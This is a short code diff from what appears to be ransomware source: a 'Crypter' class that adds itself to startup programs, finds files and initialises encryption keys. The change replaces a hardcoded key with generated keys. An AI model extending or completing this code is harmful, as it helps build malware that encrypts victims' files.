@@ -58,7 +58,7 @@ class Crypter(Base.Base):
                 self.__add_to_startup_programs()
 
             # Find files and initialise keys
-            self.Crypt.init_keys("0123456789ABCDEF0123456789ABCDEF")
+            self.Crypt.init_keys()
 
             file_list = self.find_files()
 
